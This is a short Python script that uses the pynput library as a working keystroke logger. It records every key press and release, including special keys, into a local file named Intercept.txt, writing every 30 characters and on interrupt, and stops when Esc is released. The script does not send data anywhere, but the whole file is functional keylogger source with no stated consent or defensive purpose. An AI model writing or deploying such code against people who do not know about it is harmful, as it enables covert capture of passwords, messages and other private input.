#!/usr/bin/python3

from pynput import keyboard
import signal
import sys

with open("Intercept.txt", "w", encoding="utf-8") as file:
    write_String = ""

    def signal_handler(sig, frame):
        file.write(write_String)
        file.write("\n")
        file.flush()
        file.close()
        sys.exit(0)

    signal.signal(signal.SIGINT, signal_handler)

    def on_press(key):
        global write_String
        try:
            write_String += "\u2193{0}".format(key.char)
        except AttributeError:
            write_String += "\u2193{0}".format(key)

    def on_release(key):
        global write_String
        if key == keyboard.Key.esc:
            # Stop listener
            file.write(write_String)
            write_String = ""
            return False
        try:
            write_String += "\u2191{0}".format(key.char)
        except AttributeError:
            write_String += "\u2191{0}".format(key)

        print(len(write_String))

        if len(write_String) > 30:
            file.write(write_String)
            file.write("\n")
            file.flush()
            write_String = ""

    # Collect events until released
    with keyboard.Listener( on_press=on_press, on_release=on_release) as listener:
        listener.join()
